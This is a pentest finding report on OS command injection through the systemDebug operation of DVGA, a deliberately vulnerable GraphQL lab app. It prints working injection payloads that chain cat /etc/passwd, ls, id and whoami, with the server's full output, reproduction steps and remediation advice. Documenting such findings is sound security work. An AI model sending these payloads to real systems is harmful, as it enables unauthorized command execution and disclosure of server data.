# DVGA-013 — OS Command Injection via `systemDebug`

**Severity:**

Critical

CVSS v3.1 Score: 9.8 (Critical)

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## Overall CVSS Calculation

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CVSS Base Score:          9.8

Impact Subscore:          5.9

Exploitability Subscore:  3.9

CVSS Temporal Score:      NA

CVSS Environmental Score: NA

Modified Impact Subscore: NA

Overall CVSS Score:       9.8

**CWE:** CWE-78 — Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)

**OWASP Mapping:** A03:2021 – Injection

**Affected Endpoint:**

`/graphql`

**Affected Operation:**

`systemDebug`

**Affected Argument:**

`arg`

---

## Description

During automated testing via ZAP, ZAP identified an OS Command Injection issue in the `/graphql` endpoint.

The affected GraphQL operation was `systemDebug`, and the affected argument was `arg`.

The request identified by ZAP was:

```graphql
{systemDebug(arg:"ZAP&cat \/etc\/passwd&")}
```

The application returned the contents of `/etc/passwd` in the response:

```text
root\:x:0:0\:root:/root:/bin/bash

daemon\:x:1:1\:daemon:/usr/sbin:/usr/sbin/nologin

bin\:x:2:2\:bin:/bin:/usr/sbin/nologin

sys\:x:3:3\:sys\:/dev:/usr/sbin/nologin

sync\:x:4:65534\:sync:/bin:/bin/sync

games\:x:5:60\:games\:/usr/games\:/usr/sbin/nologin

man\:x:6:12\:man:/var/cache/man:/usr/sbin/nologin

lp\:x:7:7\:lp\:/var/spool/lpd:/usr/sbin/nologin

mail\:x:8:8\:mail:/var/mail:/usr/sbin/nologin

news\:x:9:9\:news\:/var/spool/news:/usr/sbin/nologin

uucp\:x:10:10\:uucp\:/var/spool/uucp:/usr/sbin/nologin

proxy\:x:13:13\:proxy:/bin:/usr/sbin/nologin

www-data\:x:33:33\:www-data:/var/www:/usr/sbin/nologin

backup\:x:34:34\:backup\:/var/backups\:/usr/sbin/nologin

list\:x:38:38\:Mailing List Manager:/var/list:/usr/sbin/nologin

irc\:x:39:39\:ircd:/run/ircd:/usr/sbin/nologin

_apt\:x:42:65534::/nonexistent:/usr/sbin/nologin

nobody\:x:65534:65534\:nobody:/nonexistent:/usr/sbin/nologin

dvga\:x:1000:1000::/home/dvga:/bin/sh
```

At this point, the ZAP result showed that the `arg` parameter could be used to execute an operating system command.

So, now it was time to check it manually.

I used my own payload:

```graphql
{systemDebug(arg:"ZAP;cat /etc/passwd;ls;id && whoami")}
```

The response confirmed that multiple operating system commands were successfully executed.

The response returned the contents of `/etc/passwd`, followed by the output of `ls`, `id`, and `whoami`.

This confirms that the issue is not limited to reading `/etc/passwd`. Arbitrary OS commands can be executed through the `arg` argument of the `systemDebug` operation.

---

## Affected Endpoint / Operation

**Endpoint:**

```text
/graphql
```

**GraphQL Operation:**

```graphql
systemDebug
```

**Affected Argument:**

```text
arg
```

---

## Steps to Reproduce

### Step 1 — Access the GraphQL endpoint

Send a GraphQL request to:

```text
/graphql
```

### Step 2 — Execute the vulnerable operation

Use the following GraphQL query:

```graphql
{systemDebug(arg:"ZAP;cat /etc/passwd;ls;id && whoami")}
```

### Step 3 — Observe the response

The application processes the supplied `arg` value and returns the output of the commands executed by the server.

The response first returned the contents of `/etc/passwd`:

```text
root\:x:0:0\:root:/root:/bin/bash

daemon\:x:1:1\:daemon:/usr/sbin:/usr/sbin/nologin

bin\:x:2:2\:bin:/bin:/usr/sbin/nologin

sys\:x:3:3\:sys\:/dev:/usr/sbin/nologin

sync\:x:4:65534\:sync:/bin:/bin/sync

games\:x:5:60\:games\:/usr/games\:/usr/sbin/nologin

man\:x:6:12\:man:/var/cache/man:/usr/sbin/nologin

lp\:x:7:7\:lp\:/var/spool/lpd:/usr/sbin/nologin

mail\:x:8:8\:mail:/var/mail:/usr/sbin/nologin

news\:x:9:9\:news\:/var/spool/news:/usr/sbin/nologin

uucp\:x:10:10\:uucp\:/var/spool/uucp:/usr/sbin/nologin

proxy\:x:13:13\:proxy:/bin:/usr/sbin/nologin

www-data\:x:33:33\:www-data:/var/www:/usr/sbin/nologin

backup\:x:34:34\:backup\:/var/backups:/usr/sbin/nologin

list\:x:38:38\:Mailing List Manager:/var/list:/usr/sbin/nologin

irc\:x:39:39\:ircd:/run/ircd:/usr/sbin/nologin

_apt\:x:42:65534::/nonexistent:/usr/sbin/nologin

nobody\:x:65534:65534\:nobody:/nonexistent:/usr/sbin/nologin

dvga\:x:1000:1000::/home/dvga:/bin/sh
```

The `ls` command also executed successfully and returned files and directories from the application environment:

```text
__pycache__

app.py

config.py

core

core.1

db

dvga.db

index.html

muhib.jpg

pastes

requirements.txt

routine.txt

setup.py

static

templates

venv

version.py
```

The `id` command returned:

```text
uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)
```

The `whoami` command returned:

```text
dvga
```

This confirms that the commands were actually executed by the application and that the execution took place under the `dvga` operating-system user.

---

## Proof of Concept

The manually tested GraphQL query was:

```graphql
{systemDebug(arg:"ZAP;cat /etc/passwd;ls;id && whoami")}
```

The payload uses shell command separators to append additional commands to the original input.

The following commands were successfully executed:

```text
cat /etc/passwd

ls

id

whoami
```

The successful output from these commands confirms that attacker-controlled input reaches an operating-system command execution context.

This demonstrates **arbitrary OS command execution** through the `systemDebug` GraphQL operation.

---

## HTTP Request

The vulnerable GraphQL request was sent to:

```text
POST /graphql
```

The relevant GraphQL query was:

```json
{
  "query": "{systemDebug(arg:\"ZAP;cat /etc/passwd;ls;id && whoami\")}",
  "variables": {}
}
```

---

## HTTP Response

The application returned:

```http
HTTP/2 200 OK

Content-Type: application/json

Date: Wed, 02 Sep 2026 05:44:47 GMT

Ngrok-Agent-Ips: X

Content-Length: 1145
```

The relevant response was:

```json
{
  "data": {
    "systemDebug": "root\:x:0:0\:root:/root:/bin/bash

daemon\:x:1:1\:daemon:/usr/sbin:/usr/sbin/nologin

bin\:x:2:2\:bin:/bin:/usr/sbin/nologin

sys\:x:3:3\:sys\:/dev:/usr/sbin/nologin

sync\:x:4:65534\:sync:/bin:/bin/sync

games\:x:5:60\:games\:/usr/games\:/usr/sbin/nologin

man\:x:6:12\:man:/var/cache/man:/usr/sbin/nologin

lp\:x:7:7\:lp\:/var/spool/lpd:/usr/sbin/nologin

mail\:x:8:8\:mail:/var/mail:/usr/sbin/nologin

news\:x:9:9\:news:/var/spool/news:/usr/sbin/nologin

uucp\:x:10:10\:uucp:/var/spool/uucp:/usr/sbin/nologin

proxy\:x:13:13\:proxy:/bin:/usr/sbin/nologin

www-data\:x:33:33\:www-data:/var/www:/usr/sbin/nologin

backup\:x:34:34\:backup\:/var/backups\:/usr/sbin/nologin

list\:x:38:38\:Mailing List Manager:/var/list:/usr/sbin/nologin

irc\:x:39:39\:ircd:/run/ircd:/usr/sbin/nologin

_apt\:x:42:65534::/nonexistent:/usr/sbin/nologin

nobody\:x:65534:65534\:nobody:/nonexistent:/usr/sbin/nologin

dvga\:x:1000:1000::/home/dvga:/bin/sh

__pycache__

app.py

config.py

core

core.1

db

dvga.db

index.html

muhib.jpg

pastes

requirements.txt

routine.txt

setup.py

static

templates

venv

version.py

uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)

dvga"
  }
}
```

The response provides direct evidence that the supplied commands were executed and their output was returned through the GraphQL API.

---

## Impact

An attacker who can access the vulnerable GraphQL operation may be able to execute arbitrary operating system commands on the server.

During testing, I was able to:

* Read `/etc/passwd`.

* Enumerate files and directories using `ls`.

* Identify the operating-system user and group information using `id`.

* Confirm the current execution user using `whoami`.

The commands were executed as the `dvga` user:

```text
uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)

dvga
```

Depending on the privileges available to the application process, an attacker could potentially use this access to read application files, access configuration information, interact with the application's database, obtain sensitive data, or perform further actions on the underlying server.

The impact could become significantly greater if the application is deployed with higher operating-system privileges or with access to sensitive internal resources.

---

## Risk Rating

**Critical**

This finding is rated **Critical** because attacker-controlled input can be used to execute arbitrary operating system commands through the GraphQL API.

The vulnerability was manually confirmed by successfully executing multiple commands, including filesystem enumeration and commands that identified the current operating-system user.

---

## Remediation

The application should not pass user-controlled input directly into operating-system commands.

Recommended remediation steps include:

1. Remove the use of shell commands with user-controlled input wherever possible.

2. Avoid constructing operating-system commands by concatenating user-supplied values.

3. If system-level functionality is required, use safe APIs that do not invoke a shell.

4. Apply strict allowlisting to any values that must be passed to system-level functionality.

5. Run the application with the minimum operating-system privileges required.

6. Review the `systemDebug` functionality and determine whether it is required in a production environment.

7. Disable or remove debugging functionality from production deployments.

8. Review other GraphQL operations for similar command-execution patterns.

---

## Evidence

The following evidence was collected during testing:

```text
evidence/DVGA-013-OS-Command-Injection-via-systemDebug/
```

The evidence contains the relevant request, response, and screenshots demonstrating the successful command execution.

---

## Automated Testing Notes

During **ZAP Phase-1 Testing**, ZAP identified one SQL Injection issue.

This SQL Injection had already been reported during **Day 4**, so it was treated as an existing finding and was not reported as a new vulnerability.

During **ZAP Phase-2 Testing**, ZAP identified an OS Command Injection in `/graphql` through the `systemDebug` operation.

The ZAP result was then manually checked using my own payload:

```graphql
{systemDebug(arg:"ZAP;cat /etc/passwd;ls;id && whoami")}
```

The manual testing confirmed that multiple commands were successfully executed.

This confirmed the ZAP finding as a genuine OS Command Injection vulnerability and demonstrated actual remote command execution through the GraphQL API.

Another OS Command Injection detected by ZAP was also manually tested and was determined to be a **false positive**. It was therefore not included as a confirmed vulnerability.

---

## References

* CWE-78 — Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)
* OWASP Top 10 2021 — A03:2021 Injection
